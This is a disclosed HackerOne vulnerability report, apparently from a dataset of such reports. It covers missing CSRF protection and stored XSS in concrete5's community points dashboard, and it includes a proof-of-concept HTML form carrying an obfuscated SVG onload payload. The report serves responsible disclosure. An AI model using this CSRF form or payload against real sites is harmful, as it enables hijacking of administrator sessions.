---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '65808'
original_report_id: '65808'
title: No CSRF protection when creating new community points actions, and related
  stored XSS
weakness: Cross-site Scripting (XSS) - Generic
team_handle: concretecms
created_at: '2015-06-04T01:58:02.216Z'
disclosed_at: '2015-08-26T20:02:49.287Z'
has_bounty: false
visibility: full
substate: resolved
vote_count: 2
tags:
- hackerone
- cross-site-scripting-xss-generic
---

# No CSRF protection when creating new community points actions, and related stored XSS

## Metadata

- HackerOne Report ID: 65808
- Weakness: Cross-site Scripting (XSS) - Generic
- Program: concretecms
- Disclosed At: 2015-08-26T20:02:49.287Z
- Has Bounty: No
- Visibility: full
- Substate: resolved

## Original Report

crayons

The functionality to create a new community points action does not have anti-CSRF protection, and the administrator page displaying actions for which a user can be awarded community points does not have XSS protection

An attacker could craft a malicious POST request to index.php/dashboard/users/points/actions/save, which can use the credentials of a logged-in administrator to create a new action for granting points. Further, the input to the upaName and upaHandle parameters are not sanitized when being stored. For example:


    <form action="http://www.jmpalktest.com/concrete5742/index.php/dashboard/users/points/actions/save" method="post">
      
      <input type="hidden" name="upaID" value="" />
      <input type="hidden" name="upaIsActive" value="1" />
      <input type="hidden" name="upaHandle" value="<sVg/OnLOaD=prompt(1)>" />
      <input type="hidden" name="upaName" value="XSS the admin2" />
      <input type="hidden" name="upaDefaultPoints" value="1000" />
      <input type="hidden" name="gBadgeID" value="" />

      <button type="submit">Csrf your site here!</button>

    </form>


When the resultant data is displayed at on the Community Points page at index.php/dashboard/users/points/actions/action_saved, the stored malicious content in either upaHandle or upaName is not sanitized on output (see attached images), resulting in a stored XSS attack (with an administrator as the most likely victim), which could then be used to exploit other parts of the concrete5 control panel.

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
